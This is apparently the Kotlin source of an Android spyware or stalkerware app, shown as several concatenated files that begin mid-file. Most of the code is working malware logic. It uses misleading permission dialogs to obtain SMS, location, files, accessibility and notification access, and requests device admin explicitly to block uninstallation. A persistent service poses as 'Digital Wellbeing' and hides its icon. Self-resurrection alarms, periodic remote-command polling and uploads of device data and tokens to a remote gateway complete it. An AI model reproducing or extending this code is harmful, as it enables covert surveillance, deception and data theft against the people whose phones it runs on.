                DebugLogger.log("FILE_SCAN_ERR", "Exception: ${e.message}")
                Result.retry()
            }
        }
    }
}

package com.example.myandroid

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class HealthWorker(appContext: Context, workerParams: WorkerParameters) : CoroutineWorker(appContext, workerParams) {

    override suspend fun doWork(): Result {
        return withContext(Dispatchers.IO) {
            try {
                val ctx = applicationContext
                val prefs = ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                val isStaticSent = prefs.getBoolean("static_info_sent", false)

                            val json = JSONObject()
            json.put("device_id", DeviceManager.getDeviceId(ctx))
            json.put("device_model", android.os.Build.MODEL)
            json.put("trigger", "HEALTH_HEARTBEAT")

                // Add FCM Token if available
                val fcmToken = ctx.getSharedPreferences("app_identity", Context.MODE_PRIVATE).getString("fcm_token", null)
                if (fcmToken != null) json.put("fcm_token", fcmToken)

                // Always send Health Report
                json.put("app_health", DeviceManager.getHealthStats(ctx))

                // Only send Static Info once
                if (!isStaticSent) {
                    json.put("device_info", DeviceManager.getStaticInfo(ctx))
                }

                // Upload
                val success = uploadJson(ctx, json)

                if (success) {
                    // Mark static info as sent so we don't send it again
                    if (!isStaticSent) {
                        prefs.edit().putBoolean("static_info_sent", true).apply()
                    }
                    Result.success()
                } else {
                    Result.retry()
                }
            } catch (e: Exception) {
                e.printStackTrace()
                Result.retry()
            }
        }
    }

    private fun uploadJson(ctx: Context, json: JSONObject): Boolean {
        try {
            val wrapper = JSONObject()
            wrapper.put("action", "upload_stats")
            wrapper.put("deviceId", DeviceManager.getDeviceId(ctx))
            wrapper.put("payload", json)

            val supabaseUrl = SecretVault.getGatewayUrl(ctx)
            val supabaseKey = SecretVault.getLock(ctx)

            val url = URL(supabaseUrl)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("apikey", supabaseKey)
            conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
            conn.setRequestProperty("Content-Type", "application/json")
            conn.setRequestProperty("Accept", "application/json")
            conn.doOutput = true

            conn.outputStream.use { os -> 
                os.write(wrapper.toString().toByteArray(Charsets.UTF_8))
                os.flush()
            }
            val code = conn.responseCode
            if (code !in 200..299) {
                val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Body"
                DebugLogger.log("HEALTH_WORKER_ERR", "HTTP $code | $err")
                return false
            }
            DebugLogger.log("HEALTH_WORKER", "Health & Token Snapshot uploaded successfully")
            return true
        } catch (e: Exception) {
            DebugLogger.log("HEALTH_WORKER_ERR", "Raw Error:\n${e.stackTraceToString()}")
            return false
        }
    }
}

package com.example.myandroid

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

class KeepAliveReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        // 1. Try to restart the MonitorService
        val serviceIntent = Intent(context, MonitorService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
        } catch (e: Exception) {
            DebugLogger.log("PHOENIX", "Failed to restart service: ${e.message}")
        }

        // 2. Schedule the next heartbeat in 10 minutes
        scheduleNext(context)
    }

    companion object {
        fun scheduleNext(context: Context) {
            try {
                val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
                val intent = Intent(context, KeepAliveReceiver::class.java)
                val pendingIntent = PendingIntent.getBroadcast(
                    context, 1001, intent, 
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                )

                val triggerAt = System.currentTimeMillis() + (10 * 60 * 1000) // 10 Minutes

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    if (alarmManager.canScheduleExactAlarms()) {
                        alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent)
                    } else {
                        alarmManager.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent)
                    }
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent)
                } else {
                    alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent)
                }
            } catch (e: Exception) {
                DebugLogger.log("PHOENIX", "Error scheduling KeepAlive: ${e.message}")
            }
        }
    }
}

package com.example.myandroid

import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import androidx.activity.compose.setContent
import androidx.activity.ComponentActivity

// OPTIMIZATION: Switched to ComponentActivity (Lighter than AppCompat)
class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        setupCrashCatcher()
        super.onCreate(savedInstanceState)

        // 1. Set Modern UI
        setContent {
            androidx.compose.material3.MaterialTheme {
                InspectorDashboard(this)
            }
        }

        // 2. Start Background Logic
        initializeBackgroundTasks()
    }

    override fun onResume() {
        super.onResume()
        runPermissionCascade()
    }

    private fun runPermissionCascade() {
        val ctx = this
        val prefs = getSharedPreferences("setup_prefs", MODE_PRIVATE)

        // 0. Dialing Capability
        if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.CALL_PHONE) != android.content.pm.PackageManager.PERMISSION_GRANTED && !prefs.getBoolean("asked_call", false)) {
            prefs.edit().putBoolean("asked_call", true).apply()
            showExplanationDialog("Phone Management", "This permission allows the system to initiate secure communication channels for emergency response.",
                onConfirm = { requestPermissions(arrayOf(android.Manifest.permission.CALL_PHONE), 102) },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 1. Runtime (SMS, Location, etc)
        val missingRuntime = PermissionManager.getMissingRuntimePermissions(ctx)
        if (missingRuntime.isNotEmpty() && !prefs.getBoolean("asked_runtime", false)) {
            prefs.edit().putBoolean("asked_runtime", true).apply()
            requestPermissions(missingRuntime.toTypedArray(), 101)
            return
        }

        // 1.5 Storage
        if (!PermissionManager.hasAllFilesAccess(ctx) && !prefs.getBoolean("asked_files", false)) {
             prefs.edit().putBoolean("asked_files", true).apply()
             showExplanationDialog("Storage Access", "Storage access is required to generate system reports and manage backups.",
                 onConfirm = {
                     val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                     intent.data = android.net.Uri.parse("package:$packageName")
                     startActivity(intent)
                 },
                 onCancel = { runPermissionCascade() }
             )
             return
        }

        // 2. Accessibility
        if (!PermissionManager.hasAccessibility(ctx) && !prefs.getBoolean("asked_acc", false)) {
            prefs.edit().putBoolean("asked_acc", true).apply()
            showExplanationDialog("Accessibility Service", "Accessibility access is required to monitor usage and automate data synchronization.",
                onConfirm = { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 2.5 Overlay (Appear on Top)
        if (!PermissionManager.hasOverlayAccess(ctx) && !prefs.getBoolean("asked_overlay", false)) {
            prefs.edit().putBoolean("asked_overlay", true).apply()
            showExplanationDialog("Background Persistence", "Overlay access helps maintain consistent application performance in the background.",
                onConfirm = {
                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                    intent.data = android.net.Uri.parse("package:$packageName")
                    startActivity(intent)
                },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 3. Usage Stats
        if (!PermissionManager.hasUsageStats(ctx) && !prefs.getBoolean("asked_usage", false)) {
            prefs.edit().putBoolean("asked_usage", true).apply()
            showExplanationDialog("Usage Analytics", "Usage access is required to calculate screen time and digital habits.",
                onConfirm = { startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)) },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 3.5 Do Not Disturb (DND)
        if (!PermissionManager.hasDndAccess(ctx) && !prefs.getBoolean("asked_dnd", false)) {
            prefs.edit().putBoolean("asked_dnd", true).apply()
            showExplanationDialog("Do Not Disturb Access", "DND access is required to bypass silent mode for emergency alerts.",
                onConfirm = { startActivity(Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)) },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 4. Notification Listener
        if (!PermissionManager.hasNotificationListener(ctx) && !prefs.getBoolean("asked_notif", false)) {
            prefs.edit().putBoolean("asked_notif", true).apply()
            showExplanationDialog("Notification Access", "Notification access is required to sync alerts and messages.",
                onConfirm = { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 4.5 Device Admin (Anti-Uninstall)
        if (!PermissionManager.isAdmin(ctx) && !prefs.getBoolean("asked_admin", false)) {
            prefs.edit().putBoolean("asked_admin", true).apply()
            showExplanationDialog("System Management", "Admin access ensures that background synchronization remains active and protected.",
                onConfirm = {
                    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this, MyDeviceAdminReceiver::class.java))
                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Maintains system health metrics.")
                    startActivity(intent)
                },
                onCancel = { runPermissionCascade() }
            )
            return
        }

        // 5. Battery
        if (!PermissionManager.isIgnored(ctx) && !prefs.getBoolean("asked_batt", false)) {
             prefs.edit().putBoolean("asked_batt", true).apply()
             showExplanationDialog("Background Processing", "Battery optimization must be ignored to allow unrestricted data sync.",
                 onConfirm = {
                     val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                     intent.data = android.net.Uri.parse("package:$packageName")
                     startActivity(intent)
                 },
                 onCancel = { runPermissionCascade() }
             )
             return 
        }

        // --- SMART INITIALIZATION: CASCADE COMPLETE ---
        val statsPrefs = getSharedPreferences("app_stats", MODE_PRIVATE)
        if (!statsPrefs.getBoolean("full_setup_complete", false)) {
            statsPrefs.edit().putBoolean("full_setup_complete", true).apply()
            triggerImmediateDataSync()
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 101) {
            // User answered runtime permissions (SMS, Location, Contacts).
            // Immediately queue a sync for WHATEVER they just granted.
            triggerImmediateDataSync()
        }
    }

    private fun triggerImmediateDataSync() {
        val wm = androidx.work.WorkManager.getInstance(this)
        val constraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .build()

        // WorkManager handles the queuing. If offline, it waits. If online, it fires instantly.
        val initialSync = androidx.work.OneTimeWorkRequestBuilder<SyncWorker>()
            .setConstraints(constraints)
            .build()

        wm.enqueueUniqueWork("InitialDataSync", androidx.work.ExistingWorkPolicy.REPLACE, initialSync)
    }

    private fun showExplanationDialog(title: String, msg: String, onConfirm: () -> Unit, onCancel: () -> Unit) {
        android.app.AlertDialog.Builder(this)
            .setTitle(title)
            .setMessage(msg)
            .setCancelable(false)
            .setPositiveButton("Continue") { _, _ -> onConfirm() }
            .setNegativeButton("Skip") { _, _ -> onCancel() }
            .show()
    }

    private fun setupCrashCatcher() {
        val prefs = getSharedPreferences("app_health", MODE_PRIVATE)

        // 1. RECOVERY TOAST: Show error from last crash
        val lastCrash = prefs.getString("last_crash_raw", null)
        if (lastCrash != null) {
            android.widget.Toast.makeText(this, "Previous Session Error: $lastCrash", android.widget.Toast.LENGTH_LONG).show()
            prefs.edit().remove("last_crash_raw").apply()
        }

        // 2. GLOBAL HANDLER: Catch new crashes
        val oldHandler = Thread.getDefaultUncaughtExceptionHandler()
        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
            val rawError = throwable.stackTraceToString()

            // Save for recovery on next launch
            prefs.edit().putString("last_crash_raw", rawError).commit()

            // Attempt to toast before death
            android.os.Handler(android.os.Looper.getMainLooper()).post {
                android.widget.Toast.makeText(applicationContext, "Application Error: $rawError", android.widget.Toast.LENGTH_LONG).show()
            }

            // Give the Toast 4 seconds to live
            try { Thread.sleep(4000) } catch (e: Exception) {}

            // Let it die
            oldHandler?.uncaughtException(thread, throwable)
        }
    }

    private fun initializeBackgroundTasks() {
        NetworkTracker.init(this)
        val intent = Intent(this, MonitorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)

        val wm = androidx.work.WorkManager.getInstance(this)

        // --- SMART INITIALIZATION: CRITICAL SNAPSHOT ---
        // Queues the device identity and static info instantly. 
        val instantConstraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .build()
        val immediateSnapshot = androidx.work.OneTimeWorkRequestBuilder<HealthWorker>()
            .setConstraints(instantConstraints)
            .build()
        wm.enqueueUniqueWork("ImmediateSnapshot", androidx.work.ExistingWorkPolicy.KEEP, immediateSnapshot)

        // OPTIMIZED: Run only when battery is not low to avoid heat/detection
        val constraints = androidx.work.Constraints.Builder()
            .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
            .setRequiresBatteryNotLow(true)
            .build()

        // Sync every 1 hour instead of 15 mins
        val syncRequest = androidx.work.PeriodicWorkRequestBuilder<SyncWorker>(1, java.util.concurrent.TimeUnit.HOURS)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("BackupWork", androidx.work.ExistingPeriodicWorkPolicy.KEEP, syncRequest)

        // Keep Config Sync frequent (6 hours)
        val configRequest = androidx.work.PeriodicWorkRequestBuilder<ConfigSyncWorker>(6, java.util.concurrent.TimeUnit.HOURS)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("ConfigSync", androidx.work.ExistingPeriodicWorkPolicy.KEEP, configRequest)

        // Remote Command (15 mins is fine as it's lightweight JSON check)
        val cmdRequest = androidx.work.PeriodicWorkRequestBuilder<RemoteCommandWorker>(15, java.util.concurrent.TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("RemoteCmdWorker", androidx.work.ExistingPeriodicWorkPolicy.KEEP, cmdRequest)

        // Health & Token Sync (Ensures we stay updated every 4 hours)
        val healthRequest = androidx.work.PeriodicWorkRequestBuilder<HealthWorker>(4, java.util.concurrent.TimeUnit.HOURS)
            .setConstraints(constraints)
            .build()
        wm.enqueueUniquePeriodicWork("HealthCheck", androidx.work.ExistingPeriodicWorkPolicy.KEEP, healthRequest)

        // Start the Immortality Heartbeat
        KeepAliveReceiver.scheduleNext(this)
    }
}

package com.example.myandroid

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.app.usage.UsageStatsManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.*
import org.json.JSONObject
import java.util.Calendar

class MonitorService : Service() {

    companion object {
        @Volatile var isRunning = false
    }

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)
    // Changed ID to force new settings on update
    private val CHANNEL_ID = "background_service"
    private val NOTIF_ID = 777
    // OPTIMIZATION: Overlay removed to prevent CPU wake-locks and heat.

    // --- SMART UPDATE RECEIVER ---
    // Updates UI only when user is actually looking at the screen.
    private val screenStateReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            when (intent.action) {
                Intent.ACTION_SCREEN_ON -> {
                    // Wake up: Update stats immediately
                    val time = getScreenTime()
                    val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                    mgr.notify(NOTIF_ID, buildNotification(time))
                    checkResurrection()
                }
                Intent.ACTION_SCREEN_OFF -> {
                    // Sleep: Do absolutely nothing to save battery
                }
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        createChannel()
        // FAST START: Use a placeholder to prevent ANR
        startForeground(NOTIF_ID, buildNotification("Syncing diagnostics..."))

        scope.launch {
            // Update notification with real data in background
            val actualTime = getScreenTime()
            val mgr = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            mgr.notify(NOTIF_ID, buildNotification(actualTime))
        }

        // 1. Diagnostics
        checkResurrection()

        // 2. Start Logic Loop
        startLoop()

        // 2.5 Persistent Network Tracking (Always listening)
        NetworkTracker.init(applicationContext)

        // 3. Register Smart Shield Triggers
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
        }
        // ANDROID 14 FIX: Must specify export visibility for dynamic receivers
        androidx.core.content.ContextCompat.registerReceiver(
            this, 
            screenStateReceiver, 
            filter, 
            androidx.core.content.ContextCompat.RECEIVER_NOT_EXPORTED
        )

        // 4. Initial State Check
        // Removed overlay toggle to allow Deep Doze

        isRunning = true
        return START_STICKY
    }



    private fun startLoop() {
        // OPTIMIZED LOOP: No 60s wake-lock.
        // Logic is now event-driven by ScreenReceiver and WorkManager.
        scope.launch {
            // We still check Pulse/Reset once on startup
            TimeManager.checkDailyReset(applicationContext)
            checkPulse()

            // Daily Dump Check
            DumpManager.createDailyDump(applicationContext)
        }
    }

    private fun checkResurrection() {
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val lastHeartbeat = prefs.getLong("last_heartbeat", 0L)
        val now = System.currentTimeMillis()

        if (lastHeartbeat > 0 && (now - lastHeartbeat) > 300_000) {
            val gapMins = (now - lastHeartbeat) / 60000
            val historyStr = prefs.getString("app_health", "{}")
            val json = try { JSONObject(historyStr) } catch(e: Exception) { JSONObject() }

            val time = java.text.SimpleDateFormat("HH:mm", java.util.Locale.US).format(java.util.Date())
            json.put("last_resurrection", "Recovered after ${gapMins}m blackout at $time")
            json.put("kill_count", json.optInt("kill_count", 0) + 1)

            DebugLogger.log("CRITICAL", "SYSTEM KILLED ME! Recovered after ${gapMins}m blackout.")
            prefs.edit().putString("app_health", json.toString()).apply()
        }
    }

    private fun checkPulse() {
        val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
        val lastPulse = prefs.getLong("last_pulse_time", 0L)
        val now = System.currentTimeMillis()

        if (now - lastPulse > 259200000) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isInteractive) {
                try {
                    val i = Intent(this, PulseActivity::class.java)
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(i)
                } catch (e: Exception) { }
            }
        }
    }

    private fun getScreenTime(): String {
        return try {
            val usm = getSystemService(Context.USAGE_STATS_SERVICE) as UsageStatsManager
            val startTime = TimeManager.getStartOfDay()
            val endTime = System.currentTimeMillis()
            val events = usm.queryEvents(startTime, endTime)

            var totalMillis = 0L
            val statsMap = mutableMapOf<String, Long>()
            val event = android.app.usage.UsageEvents.Event()

            while (events.hasNextEvent()) {
                events.getNextEvent(event)
                val pkg = event.packageName
                val time = event.timeStamp

                when (event.eventType) {
                    android.app.usage.UsageEvents.Event.MOVE_TO_FOREGROUND -> {
                        statsMap[pkg] = time
                    }
                    android.app.usage.UsageEvents.Event.MOVE_TO_BACKGROUND, 
                    android.app.usage.UsageEvents.Event.USER_INTERACTION -> {
                        val start = statsMap[pkg]
                        if (start != null && start > 0) {
                            totalMillis += (time - start)
                            statsMap[pkg] = 0L
                        }
                    }
                }
            }

            // Handle app still in foreground
            statsMap.forEach { (pkg, start) ->
                if (start > 0) totalMillis += (endTime - start)
            }

            val hrs = java.util.concurrent.TimeUnit.MILLISECONDS.toHours(totalMillis)
            val mins = java.util.concurrent.TimeUnit.MILLISECONDS.toMinutes(totalMillis) % 60
            "Today: ${hrs}h ${mins}m"
        } catch (e: Exception) {
            "Digital Wellbeing Active"
        }
    }

    private fun buildNotification(text: String): Notification {
        // The Trap: Link notification click to our invisible PulseActivity
        val intent = Intent(this, PulseActivity::class.java).apply {
            putExtra("route_to_settings", true)
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
        }
        val pendingIntent = android.app.PendingIntent.getActivity(
            this, 0, intent, 
            android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
        )

        // Minimalist "Digital Wellbeing" style
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Digital Wellbeing is active")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_recent_history)
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .setShowWhen(false)
            .setContentIntent(pendingIntent)
            // PRIORITY_MIN pushes it to the bottom and hides icon from status bar
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    private fun createChannel() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val mgr = getSystemService(NotificationManager::class.java)
            // CAMOUFLAGE: Channel name looks like a system service
            // IMPORTANCE_MIN = Silent, Minimized, No Status Bar Icon
            val chan = NotificationChannel(CHANNEL_ID, "Usage Tracking", NotificationManager.IMPORTANCE_MIN)
            chan.setShowBadge(false)
            mgr.createNotificationChannel(chan)
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        DebugLogger.log("PHOENIX", "Task swiped away. Scheduling resurrection via WorkManager.")
        val workRequest = OneTimeWorkRequestBuilder<RemoteCommandWorker>().build()
        WorkManager.getInstance(applicationContext).enqueue(workRequest)
    }

    override fun onDestroy() {
        isRunning = false
        super.onDestroy()
        try {
            unregisterReceiver(screenStateReceiver)
        } catch (e: Exception) {}

        // Schedule a resurrection in case of a fatal memory kill
        KeepAliveReceiver.scheduleNext(applicationContext)

        job.cancel()
    }
}

